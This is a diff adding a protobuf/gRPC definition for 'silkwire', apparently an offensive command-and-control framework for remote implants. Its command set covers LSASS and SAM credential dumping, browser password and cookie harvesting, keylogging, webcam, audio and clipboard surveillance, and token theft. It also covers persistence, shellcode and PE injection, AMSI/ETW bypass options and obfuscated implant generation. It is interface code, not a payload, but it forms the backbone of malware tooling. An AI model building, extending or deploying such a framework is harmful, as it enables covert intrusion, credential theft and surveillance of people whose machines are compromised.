@@ -1,0 +1,495 @@
+syntax = "proto3";
+
+package c2;
+
+option go_package = "silkwire/proto";
+
+// C2 Service Definition
+service C2Service {
+  // Initial implant registration
+  rpc Register(RegistrationRequest) returns (RegistrationResponse);
+  
+  // Bidirectional streaming for real-time communication
+  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
+  
+  // File upload/download operations
+  rpc UploadFile(stream FileChunk) returns (FileResponse);
+  rpc DownloadFile(FileRequest) returns (stream FileChunk);
+  
+  // Task management
+  rpc GetTasks(TaskRequest) returns (TaskResponse);
+  rpc SubmitResult(TaskResult) returns (TaskAck);
+  
+  // Console/Admin operations
+  rpc ListSessions(SessionListRequest) returns (SessionListResponse);
+  rpc DeleteSession(SessionDeleteRequest) returns (SessionDeleteResponse);
+  rpc SendCommand(SendCommandRequest) returns (SendCommandResponse);
+  rpc GetCommandResult(CommandResultRequest) returns (CommandResultResponse);
+
+  // PTY streaming for interactive shells
+  rpc PTYStream(stream PTYClientMessage) returns (stream PTYServerMessage);
+
+  // Listener management
+  rpc AddListener(ListenerAddRequest) returns (ListenerAddResponse);
+  rpc ListListeners(ListenerListRequest) returns (ListenerListResponse);
+  rpc RemoveListener(ListenerRemoveRequest) returns (ListenerRemoveResponse);
+  
+  // Implant generation
+  rpc GenerateImplant(ImplantGenerationRequest) returns (ImplantGenerationResponse);
+
+  // Implant build tracking
+  rpc ListImplantBuilds(ImplantBuildsListRequest) returns (ImplantBuildsListResponse);
+
+  // Session event streaming for real-time console notifications
+  rpc SessionEventStream(SessionEventStreamRequest) returns (stream SessionEvent);
+}
+
+// Registration Messages
+message RegistrationRequest {
+  string implant_id = 1;
+  string hostname = 2;
+  string username = 3;
+  string os = 4;
+  string arch = 5;
+  string process_name = 6;
+  int32 pid = 7;
+  repeated string network_interfaces = 8;
+  string implant_version = 9;
+}
+
+message RegistrationResponse {
+  bool success = 1;
+  string session_token = 2;
+  int32 beacon_interval = 3;
+  int32 jitter_percent = 4;
+  string message = 5;
+}
+
+// Beacon Communication
+message BeaconMessage {
+  string implant_id = 1;
+  string session_token = 2;
+  int64 timestamp = 3;
+  BeaconType type = 4;
+  bytes payload = 5;
+  
+  
+  enum BeaconType {
+    HEARTBEAT = 0;
+    TASK_RESULT = 1;
+    ERROR = 2;
+    LOG = 3;
+    PTY_OUTPUT = 4; // payload: command_id|<raw-bytes>
+    PTY_EXIT = 5;   // payload: command_id|exit_code
+  }
+}
+
+message CommandMessage {
+  string command_id = 1;
+  CommandType type = 2;
+  string command = 3;
+  repeated string args = 4;
+  bytes data = 5;
+  int32 timeout = 6;
+  // Execute-assembly specific options
+  ExecuteAssemblyOptions execute_assembly_options = 7;
+  // Execute-shellcode specific options
+  ExecuteShellcodeOptions execute_shellcode_options = 8;
+  // Execute-PE specific options
+  ExecutePEOptions execute_pe_options = 9;
+  // Execute-BOF specific options
+  BOFOptions bof_options = 10;
+  
+  enum CommandType {
+    SHELL = 0;
+    POWERSHELL = 1;
+    UPLOAD = 2;
+    DOWNLOAD = 3;
+    SLEEP = 4;
+    KILL = 5;
+    SCREENSHOT = 6;
+    KEYLOG = 7;
+    PROCESS_LIST = 8;
+    NETWORK_SCAN = 9;
+    PTY_START = 10; // command: shell path or empty; args: cols, rows
+    PTY_STDIN = 11; // data: raw stdin bytes
+    PTY_RESIZE = 12; // args: cols, rows
+    PTY_STOP = 13; // stop PTY session
+    INFO = 14; // collect system information
+    MODULE_LOAD = 15; // load a module: command=module_name, args=module_params
+    MODULE_START = 16; // start a loaded module: command=module_name, args=start_params
+    MODULE_STOP = 17; // stop a running module: command=module_name
+    MODULE_STATUS = 18; // get status of a module: command=module_name
+    MODULE_CONFIG = 19; // configure a module: command=module_name, data=config_json
+    MODULE_LIST = 20; // list all available/loaded modules
+    HASHDUMP = 21; // dump SAM database hashes (Windows only)
+
+    // SOCKS Proxy & Port Forwarding
+    SOCKS_START = 22; // args: [port] - start SOCKS5 proxy on specified port
+    SOCKS_STOP = 23; // stop SOCKS5 proxy
+    PORTFWD_ADD = 24; // args: [bind_port, forward_host, forward_port] - add port forward
+    PORTFWD_REMOVE = 25; // args: [bind_port] - remove port forward
+    PORTFWD_LIST = 26; // list active port forwards
+
+    // .NET Assembly Execution
+    EXECUTE_ASSEMBLY = 27; // data: assembly bytes, args: assembly arguments
+
+    // Persistence Mechanisms
+    PERSIST_INSTALL = 28; // args: [method] - install persistence (registry/task/service/cron)
+    PERSIST_REMOVE = 29; // args: [method] - remove persistence
+    PERSIST_LIST = 30; // list installed persistence mechanisms
+
+    // Credential Harvesting
+    DUMP_LSASS = 31; // dump LSASS process memory (Windows)
+    HARVEST_CHROME = 32; // harvest Chrome passwords/cookies
+    HARVEST_FIREFOX = 33; // harvest Firefox passwords/cookies
+    HARVEST_EDGE = 34; // harvest Edge passwords/cookies
+    HARVEST_ALL_BROWSERS = 35; // harvest all browser credentials
+
+    // Process Migration
+    MIGRATE = 38; // args: [pid] - migrate implant to another process
+
+    // Surveillance Features
+    CLIPBOARD_MONITOR = 40; // args: [duration_seconds] - monitor clipboard for specified duration
+    KEYLOG_START = 41; // start keylogger with window title tracking
+    KEYLOG_STOP = 42; // stop keylogger and retrieve logs
+    SCREENSHOT_CAPTURE = 43; // capture screenshot, returns image data
+    AUDIO_CAPTURE = 44; // args: [duration_seconds] - record audio from microphone
+    WEBCAM_CAPTURE = 45; // args: [duration_seconds, format] - capture from webcam (photo/video)
+
+    // Token Manipulation (Windows)
+    TOKEN_LIST = 46; // list available tokens from running processes
+    TOKEN_STEAL = 47; // args: [pid] - steal token from process
+    TOKEN_IMPERSONATE = 48; // args: [token_id] - impersonate stolen token
+    TOKEN_REVERT = 49; // revert to original token
+    TOKEN_MAKE_TOKEN = 50; // args: [domain, username, password] - create token with credentials
+
+    // Memory execution
+    EXECUTE_SHELLCODE = 51; // data: raw shellcode, options: execution method/target
+    EXECUTE_PE = 52; // data: loader shellcode, options: sacrificial process settings
+    EXECUTE_BOF = 53; // data: BOF .o file bytes, options: BOF execution settings
+  }
+}
+
+// PTY streaming API (console <-> server). Server forwards to implant via CommandMessage
+message PTYClientMessage {
+  oneof msg {
+    PTYOpen open = 1;
+    PTYInput input = 2;
+    PTYResize resize = 3;
+    PTYClose close = 4;
+  }
+}
+
+message PTYServerMessage {
+  oneof msg {
+    PTYOutput output = 1;
+    PTYClosed closed = 2;
+    PTYError error = 3;
+  }
+}
+
+message PTYOpen {
+  string implant_id = 1;
+  string shell = 2; // e.g., /bin/sh, cmd.exe
+  int32 cols = 3;
+  int32 rows = 4;
+}
+
+message PTYInput {
+  string implant_id = 1;
+  string command_id = 2;
+  bytes data = 3;
+}
+
+message PTYResize {
+  string implant_id = 1;
+  string command_id = 2;
+  int32 cols = 3;
+  int32 rows = 4;
+}
+
+message PTYClose {
+  string implant_id = 1;
+  string command_id = 2;
+}
+
+message PTYOutput {
+  string command_id = 1;
+  bytes data = 2;
+}
+
+message PTYClosed {
+  string command_id = 1;
+  int32 exit_code = 2;
+}
+
+message PTYError {
+  string command_id = 1;
+  string message = 2;
+}
+
+// Execute-assembly configuration options
+message ExecuteAssemblyOptions {
+  string app_domain = 1;          // Custom AppDomain name (random if empty)
+  string runtime = 2;             // .NET runtime version (default: v4)
+  bool amsi_bypass = 3;           // Enable AMSI bypass (default: false)
+  bool etw_bypass = 4;            // Enable ETW bypass (default: false)
+  ExecutionMethod method = 5;     // Execution method (default: sacrificial process)
+  string sacrificial_process = 6; // Sacrificial process path (default: dllhost.exe)
+  uint32 ppid = 7;                // Parent process ID for PPID spoofing (0 = no spoofing)
+  string class_name = 8;          // Class name for DLL assemblies (Donut)
+  string method_name = 9;         // Method name for DLL assemblies (Donut)
+
+  enum ExecutionMethod {
+    SACRIFICIAL = 0;  // Default: spawn sacrificial process with donut
+    IN_PROCESS = 1;   // Risky: execute in implant process via CLR hosting
+  }
+}
+
+// Execute-shellcode configuration options
+message ExecuteShellcodeOptions {
+  enum ExecutionMethod {
+    SELF = 0;                 // Execute shellcode inside implant process
+    REMOTE = 1;               // CreateRemoteThread in target process
+    RTL_CREATE_USER_THREAD = 2; // RtlCreateUserThread into target process
+    USER_APC = 3;             // QueueUserAPC against target process threads
+  }
+
+  ExecutionMethod method = 1;
+  uint32 pid = 2; // Target process ID for remote methods (ignored for SELF)
+}
+
+// Execute-PE configuration options
+message ExecutePEOptions {
+  string spawn_to = 1; // Sacrificial process path (default: WerFault.exe)
+  string arguments = 2; // Optional command-line arguments for sacrificial process
+  uint32 ppid = 3; // Optional parent process ID for PPID spoofing
+}
+
+// Execute-BOF configuration options
+message BOFOptions {
+  enum ExecutionMethod {
+    IN_PROCESS = 0;      // Execute BOF in implant process (goffloader) - Fast but risky
+    SACRIFICIAL = 1;     // Execute BOF in sacrificial process (not yet implemented)
+  }
+
+  ExecutionMethod method = 1;           // Execution method (default: in-process)
+  string entry_point = 2;               // BOF entry point function (default: "go")
+  repeated string arguments = 3;        // BOF arguments with type prefixes (z/Z/i/s/b)
+  string sacrificial_process = 4;       // Sacrificial process path for SACRIFICIAL mode (default: rundll32.exe)
+  uint32 ppid = 5;                      // Parent process ID for PPID spoofing (SACRIFICIAL mode only)
+}
+
+// Listener management
+enum ListenerType {
+  LISTENER_HTTP = 0;  // plaintext gRPC (no TLS)
+  LISTENER_HTTPS = 1; // TLS
+  LISTENER_MTLS = 2;  // Mutual TLS (client cert required)
+}
+
+message Listener {
+  string id = 1;
+  string address = 2; // host:port
+  int64 started_at = 3;
+  ListenerType type = 4;
+}
+
+message ListenerAddRequest {
+  string address = 1;
+  ListenerType type = 2;
+  string cert_file = 3; // optional; default server.crt
+  string key_file = 4;  // optional; default server.key
+  string ca_file = 5;   // for mTLS client CA
+}
+message ListenerAddResponse {
+  bool success = 1;
+  string message = 2;
+  Listener listener = 3;
+}
+
+message ListenerListRequest {}
+message ListenerListResponse { repeated Listener listeners = 1; }
+
+message ListenerRemoveRequest { string id = 1; }
+message ListenerRemoveResponse { bool success = 1; string message = 2; }
+
+// Implant Generation
+message ImplantGenerationRequest {
+  string listener_id = 1;    // Generate implant for specific listener
+  string format = 2;         // "go", "exe", "source" - output format
+  string os = 3;             // "linux", "windows", "darwin" - target OS
+  string arch = 4;           // "amd64", "386", "arm64" - target architecture
+  map<string, string> options = 5; // Additional build options
+}
+
+message ImplantGenerationResponse {
+  bool success = 1;
+  string message = 2;
+  bytes payload = 3;         // Generated implant binary or source
+  string filename = 4;       // Suggested filename
+  ImplantConfig config = 5;  // Configuration used for generation
+}
+
+message ImplantConfig {
+  string server_address = 1;
+  string transport_type = 2; // "HTTP", "HTTPS", "mTLS"
+  bool skip_verify = 3;      // Skip TLS verification
+  string ca_cert = 4;        // CA certificate for mTLS
+  map<string, string> metadata = 5; // Additional configuration
+}
+
+// Implant Build Tracking
+message ImplantBuildsListRequest {}
+
+message ImplantBuildsListResponse {
+  repeated ImplantBuildInfo builds = 1;
+}
+
+message ImplantBuildInfo {
+  string build_id = 1;
+  string listener_id = 2;
+  string filename = 3;
+  string codename = 4;
+  string os = 5;
+  string arch = 6;
+  string format = 7;
+  int32 obfuscation_level = 8;
+  repeated string obfuscation_techs = 9;
+  int64 build_time_ms = 10; // Build duration in milliseconds
+  int64 file_size = 11;
+  string sha256_hash = 12;
+  bool debug = 13;
+  int64 created_at = 14; // Unix timestamp
+}
+
+// Task Management
+message TaskRequest {
+  string implant_id = 1;
+  string session_token = 2;
+}
+
+message TaskResponse {
+  repeated Task tasks = 1;
+}
+
+message Task {
+  string task_id = 1;
+  CommandMessage.CommandType type = 2;
+  string command = 3;
+  repeated string args = 4;
+  bytes data = 5;
+  int32 timeout = 6;
+  int64 created_at = 7;
+}
+
+message TaskResult {
+  string implant_id = 1;
+  string task_id = 2;
+  bool success = 3;
+  bytes output = 4;
+  string error = 5;
+  int64 completed_at = 6;
+}
+
+message TaskAck {
+  bool received = 1;
+  string message = 2;
+}
+
+// File Transfer
+message FileChunk {
+  string file_id = 1;
+  string filename = 2;
+  bytes data = 3;
+  int32 chunk_number = 4;
+  bool is_last = 5;
+  int64 total_size = 6;
+}
+
+message FileRequest {
+  string implant_id = 1;
+  string file_path = 2;
+  string file_id = 3;
+}
+
+message FileResponse {
+  bool success = 1;
+  string file_id = 2;
+  string message = 3;
+  int64 total_size = 4;
+}
+
+// Console/Admin Messages
+message SessionListRequest {
+  string auth_token = 1; // Optional authentication token
+}
+
+message SessionInfo {
+  string implant_id = 1;
+  string codename = 2;
+  string hostname = 3;
+  string username = 4;
+  string os = 5;
+  string arch = 6;
+  string process_name = 7;
+  int32 pid = 8;
+  repeated string network_interfaces = 9;
+  int64 last_seen = 10;
+  int64 created = 11;
+  string transport = 12; // Listener transport: "HTTP", "HTTPS", "mTLS", "unknown"
+}
+
+message SessionListResponse {
+  repeated SessionInfo sessions = 1;
+}
+
+message SessionDeleteRequest {
+  string implant_id = 1;
+}
+
+message SessionDeleteResponse {
+  bool success = 1;
+  string message = 2;
+}
+
+message SendCommandRequest {
+  string implant_id = 1;
+  CommandMessage command = 2;
+}
+
+message SendCommandResponse {
+  bool success = 1;
+  string message = 2;
+  string command_id = 3; // Return command ID for tracking
+}
+
+message CommandResultRequest {
+  string command_id = 1;
+  int32 timeout_seconds = 2; // How long to wait for result
+}
+
+message CommandResultResponse {
+  bool ready = 1; // True if result is available
+  bool success = 2; // True if command succeeded
+  string output = 3; // Command output
+  string error = 4; // Error message if failed
+}
+
+// Session Event Streaming
+message SessionEventStreamRequest {
+  // Empty for now - could add filtering options later
+}
+
+message SessionEvent {
+  SessionEventType event_type = 1;
+  SessionInfo session = 2;
+  int64 timestamp = 3;
+  string message = 4; // Optional human-readable message
+  
+  enum SessionEventType {
+    SESSION_ESTABLISHED = 0; // New session created
+    SESSION_LOST = 1;        // Session disconnected/timed out
+    SESSION_UPDATED = 2;     // Session information updated
+  }
+}
